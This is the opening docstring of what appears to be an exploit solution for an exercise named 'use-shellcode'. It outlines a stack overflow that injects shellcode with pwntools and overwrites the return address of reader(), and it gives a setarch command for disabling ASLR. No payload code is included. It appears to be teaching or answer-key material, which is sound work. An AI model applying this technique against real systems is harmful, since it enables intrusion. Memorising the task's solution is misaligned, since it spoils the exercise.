"""
Solution (exploit) for use-shellcode task.

Use pwntools (https://docs.pwntools.com/en/stable/) to inject a shellcode and
overwrite the return address of reader() to jump to the shellcode.

The executable uses DEP, doesn't use canary and assumes ASLR is disabled.
To run an ASLR disabled shell, do:
   setarch $(uname -m) -R /bin/bash
